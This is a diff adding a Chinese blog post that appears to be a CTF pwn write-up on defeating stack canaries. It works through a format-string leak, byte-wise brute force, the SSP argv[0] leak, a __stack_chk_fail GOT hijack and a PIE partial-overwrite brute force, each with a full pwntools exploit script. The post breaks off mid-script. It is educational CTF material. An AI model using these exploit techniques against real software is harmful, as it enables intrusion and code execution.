@@ -1,0 +1,571 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>canary崩坏技巧 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="题目1：bin方法介绍：leak canary利用格式化字符串漏洞，泄露出canary的值，然后填到canary相应的位置从而绕过保护实现栈溢出。
+开始分析：常规操作，先checksec下，再ida,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">canary崩坏技巧</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/canary%E5%B4%A9%E5%9D%8F%E6%8A%80%E5%B7%A7/" title="canary崩坏技巧" class="">canary崩坏技巧</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    62k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    56 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/canary/" rel="tag">canary</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="题目1：bin"><a href="#题目1：bin" class="headerlink" title="题目1：bin"></a>题目1：bin</h3><h4 id="方法介绍：leak-canary"><a href="#方法介绍：leak-canary" class="headerlink" title="方法介绍：leak canary"></a>方法介绍：leak canary</h4><p>利用格式化字符串漏洞，泄露出canary的值，然后填到canary相应的位置从而绕过保护实现栈溢出。</p>
+<h4 id="开始分析："><a href="#开始分析：" class="headerlink" title="开始分析："></a>开始分析：</h4><p>常规操作，先checksec下，再ida静态分析</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-1b92393b1dbc3759.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><a id="more"></a><br><img src="https://upload-images.jianshu.io/upload_images/9085575-fc97b18fc605422c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-3004a1318615c969.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>很明显有格式化字符串漏洞和栈溢出漏洞，但是开了栈溢出保护，程序有2个输入，第一次输入可以先泄露cananry，第二次直接覆盖canary就可以栈溢出了，简单明了，gdb动态调试，可以看到canary在格式化字符串的偏移为7，<br><img src="https://upload-images.jianshu.io/upload_images/9085575-7cfbebd838e16d48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>在第二个次输入中，我们需要输入到canary进行覆盖工作，这是可以看ida：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-4dc27cb695e77e8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-f266741f715e3062.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-783b734f24cb0c25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以知道0x70-0xC = 0x64=100，那么就是说要覆盖100个字符才到canary的位置，这样就可以栈溢出了，跳转到这里即可：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-72de5566fdac508d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>EXP的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)<span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bin'</span>)</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./bin'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">''</span>,)</span><br><span class="line">	libc = ELF(<span class="string">'./'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%7$x'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">canary = int(p.recv(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> canary </span><br><span class="line">getflag = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">100</span> + p32(canary) + <span class="string">'a'</span>*<span class="number">12</span> + p32(getflag)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-9ac6de6e33f4c00f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="题目2：bin1"><a href="#题目2：bin1" class="headerlink" title="题目2：bin1"></a>题目2：bin1</h3><h4 id="方法介绍：爆破canary"><a href="#方法介绍：爆破canary" class="headerlink" title="方法介绍：爆破canary"></a>方法介绍：爆破canary</h4><p>利用fork进程特征，canary的不变性，通过循环爆破canary的每一位</p>
+<h4 id="开始分析：-1"><a href="#开始分析：-1" class="headerlink" title="开始分析："></a>开始分析：</h4><p><img src="https://upload-images.jianshu.io/upload_images/9085575-1a5f7c1f86d8857b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-78a96222929ea81c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-b2276e8033ab98e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>有栈溢出漏洞，但是开启了栈溢出保护，又因为是线程，联想到爆破法，这题的canary地址和上题一样，先覆盖100位，再填，我们知道程序的canary的最后一位是0，所以可以一个一个地跑。<br><img src="https://upload-images.jianshu.io/upload_images/9085575-65f87987165226b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>因为canary有4位，最后一位是\x00，所以还要循环3次，每一次从256（ASCII码范围）中取，有合适的+1，没有继续循环，直到跑出来，这是32位的情况，64位的话爆破7位。<br>最后栈溢出绕过直接执行那个函数。</p>
+<p>payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)<span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bin1'</span>)</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./bin1'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">''</span>,)</span><br><span class="line">	libc = ELF(<span class="string">'./'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		p.send(<span class="string">'a'</span>*<span class="number">100</span> + canary + chr(i))</span><br><span class="line">		a = p.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"recv"</span> <span class="keyword">in</span> a:</span><br><span class="line">			canary += chr(i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">getflag = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">100</span> + canary + <span class="string">'a'</span>*<span class="number">12</span> + p32(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-70729d3b139e25fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="题目3：bin2-原题是OJ的smashes"><a href="#题目3：bin2-原题是OJ的smashes" class="headerlink" title="题目3：bin2(原题是OJ的smashes)"></a>题目3：bin2(原题是OJ的smashes)</h3><h4 id="方法介绍："><a href="#方法介绍：" class="headerlink" title="方法介绍："></a>方法介绍：</h4><p>ssp攻击：argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p>
+<h4 id="开始分析：-2"><a href="#开始分析：-2" class="headerlink" title="开始分析："></a>开始分析：</h4><p><img src="https://upload-images.jianshu.io/upload_images/9085575-8e88a10d63e87429.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-c2000d5c1450efbe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这里介绍故意触发<strong>_stack_chk_fail：<br>ssp攻击：argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值，举个例子：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-285bcf81cd9547a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>但是我们不知道flag的位置在哪里，有个小技巧就是字符直接填充flag的位置，只要足够大，就一定能行，但是看看ida：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-035597e1037f16fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>发现被修改了值，所以是直接打印不出来的，这可怎么办才好，这里借助大佬的博客，说ELF的重映射，当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。这个flag应该会被映射到多个地方，也就是有副本，只要找出副本地址即可，接下来去gdb里面找：找个地址下断点，寻找CTF字符串，看到0x400d20。<br><img src="https://upload-images.jianshu.io/upload_images/9085575-954dea1f5e783eb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这下直接写进去覆盖就好啦：<br>payload：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)<span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bin2'</span>)</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./bin2'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">''</span>,)</span><br><span class="line">	libc = ELF(<span class="string">'./'</span>)</span><br><span class="line">flag = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += p64(flag)*<span class="number">1000</span></span><br><span class="line">p.recvuntil(<span class="string">"Hello!\nWhat's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>验收：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-aef2de79ffc9fcc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>如果说老老实实做也是可以的，先看看那个argv[0]在栈中的位置：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-79fbab365f28a548.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>然后看看我们的输入esp到它的距离：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-31712b42e3270fff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>计算下地址差值：0x218的偏移，所以直接：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)<span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bin2'</span>)</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./bin2'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">''</span>,)</span><br><span class="line">	libc = ELF(<span class="string">'./'</span>)</span><br><span class="line">flag = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="comment">#payload += p64(flag)*1000</span></span><br><span class="line">payload += <span class="number">0x218</span>*<span class="string">'a'</span> + p64(flag)</span><br><span class="line">p.recvuntil(<span class="string">"Hello!\nWhat's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>验收：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-4e70584c4784466d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="题目4：bin3（原题是hgame的week2的Steins）"><a href="#题目4：bin3（原题是hgame的week2的Steins）" class="headerlink" title="题目4：bin3（原题是hgame的week2的Steins）"></a>题目4：bin3（原题是hgame的week2的Steins）</h3><h4 id="方法介绍：-1"><a href="#方法介绍：-1" class="headerlink" title="方法介绍："></a>方法介绍：</h4><p>劫持<strong>stack_chk_fail函数，控制程序流程，也就是说刚开始未栈溢出时，我们先改写</strong>stack_chk_fail的got表指针内容为我们的后门函数地址，之后我们故意制造栈溢出调用<strong>stack_chk_fail时，实际就是执行我们的后门函数。</strong></p>
+<h4 id="开始分析：-3"><a href="#开始分析：-3" class="headerlink" title="开始分析："></a>开始分析：</h4><p><img src="https://upload-images.jianshu.io/upload_images/9085575-492331e0c5111ba9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-455183baf1e3cc68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>栈溢出保护，堆栈不可执行，格式化字符串漏洞，这里一开始真的没有什么思路，后来师傅给了提示：<br>劫持<strong>stack_chk_fail函数，控制程序流程，也就是说刚开始未栈溢出时，我们先改写</strong>stack_chk_fail的got表内容为我们的后门函数地址，之后我们故意制造栈溢出调用<strong>stack_chk_fail时，实际就是执行我们的后门函数。<br>那么问题来了，怎么覆盖好呢？我的猜想是，想到覆盖低地址0x400xxx，我们往</strong>stack_chk_fail的got表指针里写入xxx，由于_stack_chk_fail地址后有5个截断符，所以要顺利覆盖的话，%8$hn后面要有5个字符进行填充，调用时就会调用0x400xxx处的函数，后门函数地址0x40084E（ida可以看见），而0x84E = 2126，所以写入2126个双字节~，劫持后再栈溢出即可。<br>payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)<span class="comment">#64位和32位自行切换</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./babyfmtt'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./babyfmtt'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">''</span>,)</span><br><span class="line">	elf = ELF(<span class="string">'./'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(p,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line">libc = elf.libc</span><br><span class="line">stack_fail = <span class="number">0x601020</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">"%2126c%8$hnbbbbb"</span> + p64(stack_fail) + <span class="string">'a'</span>*<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#z('b*0x00000\nc')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-c2220f9d924d94dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>为了验证猜想的正确性，改下后门函数为0x40085F（会打印那个it ‘s easy to  pwn），即0x85F = 2143。<br><img src="https://upload-images.jianshu.io/upload_images/9085575-7398aae3723cecd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>猜想验证成功，正确！</p>
+<h3 id="题目5：bin4"><a href="#题目5：bin4" class="headerlink" title="题目5：bin4"></a>题目5：bin4</h3><p>babypie</p>
+<h4 id="开始分析：-4"><a href="#开始分析：-4" class="headerlink" title="开始分析："></a>开始分析：</h4><p><img src="https://upload-images.jianshu.io/upload_images/9085575-ee53596f14bf7d5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-eb566b819c25682b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>栈溢出保护，堆栈不可执行，堆栈不可写，只有got可以改，看逻辑，先输入名字到buf，刚好0x30的大小，这里马上想到泄露canary，因为后面有个printf函数，第二次输入有栈溢出漏洞（前提是绕过了栈溢出保护了），看看有没有可以getshell的函数：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-c574890eab3fb796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>随机化地址0xA3E可以直接getshell，很好，就跳转到这里吧。</p>
+<h4 id="大体思路："><a href="#大体思路：" class="headerlink" title="大体思路："></a>大体思路：</h4><p>1、因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可</p>
+<p>2、通过填充canary实现栈溢出，跳到那个0xA3E函数处，由于随机化的地址，所以第四位不知道怎么搞，这里直接爆破第四位即可</p>
+<p>EXP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babypie'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(<span class="string">'./babypie'</span>)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">''</span>,)</span><br><span class="line">        libc = ELF(<span class="string">'./'</span>)</span><br><span class="line">        <span class="comment">#第一次调用尝试调用</span></span><br><span class="line">    system_addr = <span class="string">'\x3E\x0A'</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x28</span> +<span class="string">'\x01'</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'\x01'</span>)</span><br><span class="line">    canary = <span class="string">'\x00'</span> + p.recv()[:<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(u64(canary))</span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x28</span> + canary + <span class="string">'aaaaaaaa'</span> + system_addr</span><br><span class="line">    